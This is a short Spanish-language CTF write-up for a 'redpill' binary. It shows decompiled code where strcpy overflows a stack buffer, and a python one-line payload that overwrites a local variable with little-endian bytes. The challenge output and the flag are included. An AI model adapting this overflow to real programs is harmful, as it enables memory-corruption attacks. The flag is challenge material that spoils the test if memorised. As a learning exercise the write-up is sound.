Tenemos un binario que nos pide un argumento a la hora de ejecutarse y nos pide que tomemos la pastilla roja y nos dan un numero en hexadecimall.
Si descompilamos el programa con ghidra vemos que hay una condicion que nunca se va a cumplir:

    my_pill = 0xb103743;
    strcpy(local_57,param_2[1]);
	<...SNIP...>
    
    if (my_pill == 0x60334772) {
      puts("\n  Red Pill");
	<...SNIP...>


por lo que aparentemente pongamos lo que pongamos en el argumento de entrada no se va a dar la condicion que nos pide el programa para tomar la red pill.
Este es un caso en el que podemos usar un buffer overflow para a la hora de pasar el input que se guardara en param_2[1] aprovechar la vulnerabilidad de strcpy para modificar el valor de my pill.

Lo primero que hice fue testear a poner cadena muy largas que sobrepasasen el buffer y me di cuenta que las cadenas a partir de 55 caracteres modificaban el valor de my_pill.
Ahora un detalle a tener en cuenta es que si hacemos file del binario vemos que esta en little-endian por lo que en vez de poner 60334772 a partir de la posicion 55 incuida hay que ponerlo en formato little endian, este es el payload usado:

./redpill $(python -c 'print( "A"*59  + "\x72\x47\x33\x60" )')
 Take the Red Pill!! 

     Red Pill  0x60334772
     Your Pill 0x60334772

  Red Pill
  LetsCTF{t4ke-b0th_1613973362} 
